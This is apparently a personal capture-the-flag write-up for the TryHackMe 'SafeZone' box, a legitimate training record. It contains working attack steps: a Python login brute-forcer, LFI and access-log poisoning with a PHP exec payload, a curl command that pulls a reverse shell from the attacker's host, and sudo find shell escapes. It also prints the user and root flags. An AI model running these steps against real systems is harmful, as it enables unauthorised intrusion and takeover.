# SafeZone

## nmap

```sql
─$ nmap -sC -sV -oN nmap 10.10.7.104
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-24 12:20 IST
Nmap scan report for 10.10.7.104
Host is up (0.14s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 30:6a:cd:1b:0c:69:a1:3b:6c:52:f1:22:93:e0:ad:16 (RSA)
|   256 84:f4:df:87:3a:ed:f2:d6:3f:50:39:60:13:40:1f:4c (ECDSA)
|_  256 9c:1e:af:c8:8f:03:4f:8f:40:d5:48:04:6b:43:f5:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Whoami?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.73 seconds
```

## web

![[Pasted image 20210524124731.png]]

and we have a register page and then login and also a note.txt 

![[Pasted image 20210524130307.png]]

hint for possible lfi

after register and login 
![[Pasted image 20210524130419.png]]

details source code

![[Pasted image 20210524130604.png]]


Reading the pass.txt using 

http://10.10.7.104/~files/pass.txt

![[Pasted image 20210524142705.png]]

Now the password is admin__admin
bruteforcing the missing 2 integers 

```python
import requests 
import re
import time
for i in range(10):
        for j in range(10):
                try_pass = "admin"+str(i)+str(j)+"admin"
                url = "http://10.10.129.218/index.php"
                data = {"username":'Admin', "password":try_pass, "submit":'submit'} 
                r = requests.post(url = url, data=data)
                print("trying combination = ", try_pass)
                err = re.findall("Please enter valid login details.", r.text)
                timeout = re.findall("To many failed login attempts.", r.text)
                #print(timeout)
                #print(err)
                if (err == [] and timeout == []):
                        print("pass is "+try_pass)
                        quit()
                elif(timeout !=[]):
                        print("sleeping for 60 sec")
                        time.sleep(60)
```



after running we got the pass: `admin44admin`

logging in 

from above there is hint that try to use `page` param in get

and http://10.10.129.218/detail.php?page=/etc/passwd 

looking in the page source we have confirmed lfi 

![[Pasted image 20210525132220.png]]

LFI to RCE

as we can read the access log
 view-source:http://10.10.129.218/detail.php?page=/var/log/apache2/access.log

`curl -A '<?php echo exec($_GET[cmd]) ; ?>' http://10.10.129.218/`

RCE confirmed: view-source:http://10.10.129.218/detail.php?page=/var/log/apache2/access.log&cmd=id

10.17.4.208 - - [25/May/2021:13:38:37 +0530] "GET / HTTP/1.1" 200 755 "-" "uid=33(www-data) gid=33(www-data) groups=33(www-data)"
![[Pasted image 20210525134036.png]]

Now we can uplooad the php rev shell and then call it via the lfi

upload the shell
view-source:http://10.10.249.31/detail.php?page=/var/log/apache2/access.log&cmd=curl%20http://10.17.4.208/php-reverse-shell.php%20-o%20/tmp/del.php

call it http://10.10.249.31/detail.php?page=/tmp/del.php

listen on port

got shell as www-data
![[Pasted image 20210525141820.png]]

## user

running sudo -l

![[Pasted image 20210525142121.png]]

from gtfobins
`find . -exec /bin/sh \; -quit`

after fuzzing and googling we get user as files

```
sudo -u files find . -exec /bin/sh -p \; -quit
```

![[Pasted image 20210525144058.png]]

`ls -la`

![[Pasted image 20210525144358.png]]

hash : `$6$BUr7qnR3$v63gy9xLoNzmUC1dNRF3GWxgexFs7Bdaa2LlqIHPvjuzr6CgKfTij/UVqOcawG/eTxOQ.UralcDBS0imrvVbc.`

its a sha512 hash

files:$6$BUr7qnR3$v63gy9xLoNzmUC1dNRF3GWxgexFs7Bdaa2LlqIHPvjuzr6CgKfTij/UVqOcawG/eTxOQ.UralcDBS0imrvVbc.
```
files:$6$BUr7qnR3$v63gy9xLoNzmUC1dNRF3GWxgexFs7Bdaa2LlqIHPvjuzr6CgKfTij/UVqOcawG/eTxOQ.UralcDBS0imrvVbc.
```
![[Pasted image 20210525210007.png]]

`files:magic`

again `sudo -l`

![[Pasted image 20210525144152.png]]

`sudo -uyash /usr/bin/id`

![[Pasted image 20210525214146.png]]

running `netstat -ant`
![[Pasted image 20210525214255.png]]

forwarding the port 8000 to localhost 
`ssh -L 8000:127.0.0.1:8000 files@10.10.47.62`
![[Pasted image 20210525215630.png]]

![[Pasted image 20210525215709.png]]



/login.html

![[Pasted image 20210525220252.png]]

and tryting to login with `admin:admin44admin` we cant get in. 

so upon looking the source code
 we see the values are hardcoded as `user:pass`
 
 ![[Pasted image 20210525220448.png]]
 
 and randomly trying to get something from the message section, there is a possible rce..
 
 ![[Pasted image 20210525220634.png]]
 
 and also we can ping our box.
 
 ![[Pasted image 20210525220740.png]]
 
 ![[Pasted image 20210525220751.png]]
 
 
 
 tranfer the shell using ssh and make it executable
 
 ![[Pasted image 20210525222137.png]]
 
 and exectue via the web
 ![[Pasted image 20210525222206.png]]
 and we got shell
 ![[Pasted image 20210525222226.png]]
 ![[Pasted image 20210525222340.png]]
 
 user flag === THM{c296539f3286a899d8b3f6632fd62274} 
 ![[Pasted image 20210525222437.png]]


## Root
 
 `sudo -l`
 ![[Pasted image 20210525222603.png]]
 
 on executing it seems like a copying function
 
![[Pasted image 20210525222940.png]]

 and it is.. 
 
 now we can read the root flag
 
 ![[Pasted image 20210525223137.png]]
 
root flag === THM{63a9f0ea7bb98050796b649e85481845}

 
 
 
 
